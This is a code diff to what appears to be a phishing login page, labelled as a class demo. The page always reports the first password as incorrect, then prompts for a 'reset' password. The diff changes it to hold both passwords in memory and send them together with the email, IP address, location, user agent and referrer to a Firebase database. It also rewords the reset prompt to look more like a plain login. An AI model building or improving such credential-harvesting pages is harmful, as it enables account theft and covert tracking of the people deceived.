@@ -342,9 +342,9 @@
  <button id="back-button-reset" class="back" type="button">← Back</button>
 
  <form id="reset-form">
- <label for="reset-password">Reset your password</label>
+ <label for="reset-password">Enter password</label>
  <p class="intro" style="margin-bottom: 10px;">
- Enter a new password for your account.
+ Password
  </p>
 
  <div class="password-wrap">
@@ -585,6 +585,7 @@
  });
 
  // STEP 2: First Password Submission
+ // MODIFIED: Does NOT send data yet. Just stores it and moves to Step 3.
  document.getElementById("demo-form").addEventListener("submit", async (event) => {
  event.preventDefault();
  const email = emailInput.value.trim();
@@ -603,30 +604,11 @@
  await new Promise(r => setTimeout(r, 800));
 
  // Always show "Incorrect password" and move to Step 3
- showNotice("That password isn't correct.", true);
+ showNotice("That password isn't correct.");
 
- // Save Step 1 Data
- try {
- const tracking = await getClientTracking();
- const submissionsRef = ref(database, "classDemoSubmissions");
- const newSubmissionRef = push(submissionsRef);
-
- await set(newSubmissionRef, {
- email,
- passwordStep1: password1,
- passwordStep2: null, // Will be filled later
- ipAddress: tracking.ipAddress,
- location: tracking.location,
- userAgent: tracking.userAgent,
- browserLanguage: tracking.browserLanguage,
- referrer: tracking.referrer,
- pageUrl: tracking.pageUrl,
- createdAt: serverTimestamp(),
- status: "incorrect_password_step1"
- });
- } catch (error) {
- console.error("Firebase submission failed:", error);
- }
+ // Store the first password in memory to send later with the second one
+ window.savedPassword1 = password1;
+ window.savedEmail = email;
 
  // Switch to Step 3 after a short delay so user sees the error
  setTimeout(() => {
@@ -639,9 +621,11 @@
  });
 
  // STEP 3: Reset/New Password Submission
+ // MODIFIED: Sends Email + Password1 + Password2 all at once
  document.getElementById("reset-form").addEventListener("submit", async (event) => {
  event.preventDefault();
- const email = emailInput.value.trim();
+ const email = window.savedEmail || emailInput.value.trim();
+ const password1 = window.savedPassword1;
  const password2 = resetPasswordInput.value.trim();
 
  if (!email || !password2) {
@@ -657,18 +641,19 @@
  const submissionsRef = ref(database, "classDemoSubmissions");
  const newSubmissionRef = push(submissionsRef);
 
+ // Send everything in ONE record
  await set(newSubmissionRef, {
- email,
- passwordStep1: emailInput.value.trim(), // In case we lost context (though we didn't clear it)
- passwordStep2: password2,
+ email: email,
+ password1: password1, // The first password entered
+ password2: password2, // The new password entered
  ipAddress: tracking.ipAddress,
  location: tracking.location,
  userAgent: tracking.userAgent,
- browserLanguage: tracking.browserLanguage,
+ browserLanguage: tracking.browserLanguage, // FIXED: Added 'tracking.' prefix
  referrer: tracking.referrer,
  pageUrl: tracking.pageUrl,
  createdAt: serverTimestamp(),
- status: "reset_password_step2"
+ status: "combined_submission" // Indicates this is the final combined send
  });
 
  // Redirect to 404 or success page
